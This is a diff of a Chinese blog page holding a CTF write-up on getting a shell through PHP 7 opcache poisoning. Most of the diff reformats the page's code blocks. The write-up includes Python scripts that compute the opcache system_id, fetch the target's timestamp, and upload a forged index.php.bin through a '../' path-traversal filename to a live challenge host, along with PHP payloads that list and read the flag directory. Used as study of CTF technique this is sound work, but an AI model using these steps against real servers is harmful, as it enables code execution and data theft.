@@ -116,10 +116,15 @@
 <meta property="og:site_name" content="cws6">
 <meta property="og:description" content="参考文献：https://www.jianshu.com/p/e675bd51c61         http://www.vuln.cn/6763         https://github.com/GoSecure/php7-opcache-override 题目Opcache 是一个 PHP 内置的加速模块就行，当 PHP 解析器在解析一个 PHP 文件的时候，假如该文件对应的 byte-">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-03T11:06:25.779Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-c9e44d640697cd81.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-63f4c410fe948714.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-fbcefef34900a526.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-1eb10ca5ad779e9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-03T11:12:07.737Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="php7的Opcache导致的getshell">
 <meta name="twitter:description" content="参考文献：https://www.jianshu.com/p/e675bd51c61         http://www.vuln.cn/6763         https://github.com/GoSecure/php7-opcache-override 题目Opcache 是一个 PHP 内置的加速模块就行，当 PHP 解析器在解析一个 PHP 文件的时候，假如该文件对应的 byte-">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5035860-c9e44d640697cd81.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
@@ -382,7 +387,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-12-03 19:06:25" itemprop="dateModified" datetime="2018-12-03T19:06:25+08:00">2018-12-03</time>
+                <time title="Modified: 2018-12-03 19:12:07" itemprop="dateModified" datetime="2018-12-03T19:12:07+08:00">2018-12-03</time>
               
             
           </span>
@@ -440,25 +445,36 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[opcache]</span><br><span class="line">opcache.validate_timestamps = 0   ; PHP 7 的默认值为 1，即开启时间戳校验</span><br><span class="line">opcache.file_cache_only = 1      ; PHP 7 的默认值为 0</span><br><span class="line">opcache.file_cache = /tmp/opcache</span><br><span class="line">[php]</span><br><span class="line">zend_extension=opcache.so ；有些还需要再添加这句</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>在<code>/var/www/html/opcache</code>目录下创建一个index.php，里面内容随便填写，然后运行</p>
-<figure class="highlight plain"><figcaption><span>127.0.0.1/opcache/index.php```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">![](https://upload-images.jianshu.io/upload_images/5035860-c9e44d640697cd81.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line"></span><br><span class="line">* 然后在`/tmp/opcache`目录下出现了缓存配置</span><br><span class="line">![](https://upload-images.jianshu.io/upload_images/5035860-63f4c410fe948714.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line"></span><br><span class="line">**获得目标服务器的system_id和时间戳**</span><br><span class="line">http://202.120.7.217:9527/index.php?action=phpinfo得到服务器的phpinfo.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 127.0.0.1/opcache/index.php</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p>import hashlib<br>from hashlib import md5<br>php_version = ‘7.0.28’<br>zend_extension_id = ‘API320151012,NTS’<br>architecture = ‘x86_64’<br>zend_bin_id = ‘BIN_SIZEOF_CHAR48888’</p>
-<p>print (‘PHP version :’ + php_version)<br>print (‘Zend Extension ID :’ + zend_extension_id)<br>print (‘Zend Bin ID :’ + zend_bin_id)<br>print (‘Assuming: ‘ + architecture + “ architecture”)</p>
-<p>m = hashlib.md5((php_version + zend_extension_id + zend_bin_id).encode(“gb2312”))</p>
-<p>digest = m.hexdigest()<br>print (“————“)<br>print (‘System ID : ‘ + digest)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](https://upload-images.jianshu.io/upload_images/5035860-fbcefef34900a526.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br></pre></td></tr></table></figure></p>
-<p>import requests</p>
-<p>url = ‘<a href="http://202.120.7.217:9527/index.php?action=reset&#39;" target="_blank" rel="noopener">http://202.120.7.217:9527/index.php?action=reset&#39;</a><br>r = requests.get(url)</p>
-<p>url = ‘<a href="http://202.120.7.217:9527/index.php?action=time&#39;" target="_blank" rel="noopener">http://202.120.7.217:9527/index.php?action=time&#39;</a><br>r = requests.get(url)</p>
-<p>tmp =  hex(int(r.text)).replace(‘0x’,’’)<br>time = tmp[6:8]+tmp[4:6]+tmp[2:4]+tmp[0:2]<br>print (time)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* 在010里面修改index.php.bin的`system_id`和`时间戳`</span><br><span class="line">![](https://upload-images.jianshu.io/upload_images/5035860-1eb10ca5ad779e9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line"></span><br><span class="line">* 上传修改后的index.php.bin到目标服务器对应的tmp目录下（upload.php）</span><br></pre></td></tr></table></figure></p>
-<p>import requests</p>
-<p>files = {‘file’: open(“index.php.bin”, ‘rb’)}<br>url = ‘<a href="http://202.120.7.217:9527/index.php?action=upload&amp;name=../../../../../../../../../tmp/cache/7badddeddbd076fe8352e80d8ddf3e73/var/www/html/sandbox/bad02726262861710a4eb6b90e0eb13ad8b7dacc/index.php.bin&#39;" target="_blank" rel="noopener">http://202.120.7.217:9527/index.php?action=upload&amp;name=../../../../../../../../../tmp/cache/7badddeddbd076fe8352e80d8ddf3e73/var/www/html/sandbox/bad02726262861710a4eb6b90e0eb13ad8b7dacc/index.php.bin&#39;</a><br>print (‘upload url:’)<br>print (url)<br>r = requests.post(url,files = files)<br>print (r)</p>
-<p>url = ‘<a href="http://202.120.7.217:9527/index.php?action=shell&#39;" target="_blank" rel="noopener">http://202.120.7.217:9527/index.php?action=shell&#39;</a><br>print (‘shell:’)<br>print (requests.get(url).text)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**接下来各种写shell**</span><br><span class="line">目标服务器的目录权限限制，导致不能写入一句话木马，目标服务器的system等调用系统命令等函数被禁用，导致无法反弹shell</span><br><span class="line">只能老老实实用php函数，读取想要的东西</span><br><span class="line">* 修改index.php内容，读取目录信息</span><br></pre></td></tr></table></figure>
-<p>&lt;?php<br>echo ‘OK’;<br>echo ‘scan flag dir’;<br>echo var_dump(scandir(‘/var/www/html/flag’));<br>echo ‘scan sandbox’;<br>echo var_dump(scandir(‘var/www/html/sandbox/bad02726262861710a4eb6b90e0eb13ad8b7dacc/‘));<br>?&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 运行python upload.php，发现可疑的文件或目录93f4c28c0cf0b07dfd7012dca2cb868cc0228ca</span><br><span class="line"></span><br><span class="line">* 再修改index.php里面的内容。</span><br></pre></td></tr></table></figure></p>
-<p>&lt;?php<br>echo ‘OK’;<br>echo ‘read 93f4c28c0cf0b07dfd7012dca2cb868cc0228ca:’;<br>echo base64_encode(file_get_contents(‘/var/www/html/flag/93f4c28c0cf0b07dfd7012dca2cb868cc0228ca’));<br>?&gt;<br><code>`</code></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-c9e44d640697cd81.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
 <ul>
-<li>运行python upload.php读取文件。</li>
+<li>然后在<code>/tmp/opcache</code>目录下出现了缓存配置<br><img src="https://upload-images.jianshu.io/upload_images/5035860-63f4c410fe948714.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+</ul>
+<p><strong>获得目标服务器的system_id和时间戳</strong><br><a href="http://202.120.7.217:9527/index.php?action=phpinfo得到服务器的phpinfo.txt" target="_blank" rel="noopener">http://202.120.7.217:9527/index.php?action=phpinfo得到服务器的phpinfo.txt</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from hashlib import md5</span><br><span class="line">php_version = &apos;7.0.28&apos;</span><br><span class="line">zend_extension_id = &apos;API320151012,NTS&apos;</span><br><span class="line">architecture = &apos;x86_64&apos;</span><br><span class="line">zend_bin_id = &apos;BIN_SIZEOF_CHAR48888&apos;</span><br><span class="line"></span><br><span class="line">print (&apos;PHP version :&apos; + php_version)</span><br><span class="line">print (&apos;Zend Extension ID :&apos; + zend_extension_id)</span><br><span class="line">print (&apos;Zend Bin ID :&apos; + zend_bin_id)</span><br><span class="line">print (&apos;Assuming: &apos; + architecture + &quot; architecture&quot;)</span><br><span class="line"></span><br><span class="line">m = hashlib.md5((php_version + zend_extension_id + zend_bin_id).encode(&quot;gb2312&quot;))</span><br><span class="line"></span><br><span class="line">digest = m.hexdigest()</span><br><span class="line">print (&quot;------------&quot;)</span><br><span class="line">print (&apos;System ID : &apos; + digest)</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-fbcefef34900a526.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://202.120.7.217:9527/index.php?action=reset&apos;</span><br><span class="line">r = requests.get(url)</span><br><span class="line"></span><br><span class="line">url = &apos;http://202.120.7.217:9527/index.php?action=time&apos;</span><br><span class="line">r = requests.get(url)</span><br><span class="line"></span><br><span class="line">tmp =  hex(int(r.text)).replace(&apos;0x&apos;,&apos;&apos;)</span><br><span class="line">time = tmp[6:8]+tmp[4:6]+tmp[2:4]+tmp[0:2]</span><br><span class="line">print (time)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>在010里面修改index.php.bin的<code>system_id</code>和<code>时间戳</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-1eb10ca5ad779e9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+</li>
+<li><p>上传修改后的index.php.bin到目标服务器对应的tmp目录下（upload.php）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">files = &#123;&apos;file&apos;: open(&quot;index.php.bin&quot;, &apos;rb&apos;)&#125;</span><br><span class="line">url = &apos;http://202.120.7.217:9527/index.php?action=upload&amp;name=../../../../../../../../../tmp/cache/7badddeddbd076fe8352e80d8ddf3e73/var/www/html/sandbox/bad02726262861710a4eb6b90e0eb13ad8b7dacc/index.php.bin&apos;</span><br><span class="line">print (&apos;upload url:&apos;)</span><br><span class="line">print (url)</span><br><span class="line">r = requests.post(url,files = files)</span><br><span class="line">print (r)</span><br><span class="line"></span><br><span class="line">url = &apos;http://202.120.7.217:9527/index.php?action=shell&apos;</span><br><span class="line">print (&apos;shell:&apos;)</span><br><span class="line">print (requests.get(url).text)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>接下来各种写shell</strong><br>目标服务器的目录权限限制，导致不能写入一句话木马，目标服务器的system等调用系统命令等函数被禁用，导致无法反弹shell<br>只能老老实实用php函数，读取想要的东西</p>
+<ul>
+<li><p>修改index.php内容，读取目录信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &apos;OK&apos;;</span><br><span class="line">echo &apos;scan flag dir&apos;;</span><br><span class="line">echo var_dump(scandir(&apos;/var/www/html/flag&apos;));</span><br><span class="line">echo &apos;scan sandbox&apos;;</span><br><span class="line">echo var_dump(scandir(&apos;var/www/html/sandbox/bad02726262861710a4eb6b90e0eb13ad8b7dacc/&apos;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>运行python upload.php，发现可疑的文件或目录93f4c28c0cf0b07dfd7012dca2cb868cc0228ca</p>
+</li>
+<li><p>再修改index.php里面的内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &apos;OK&apos;;</span><br><span class="line">echo &apos;read 93f4c28c0cf0b07dfd7012dca2cb868cc0228ca:&apos;;</span><br><span class="line">echo base64_encode(file_get_contents(&apos;/var/www/html/flag/93f4c28c0cf0b07dfd7012dca2cb868cc0228ca&apos;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>运行python upload.php读取文件。</p>
+</li>
 </ul>
 
       
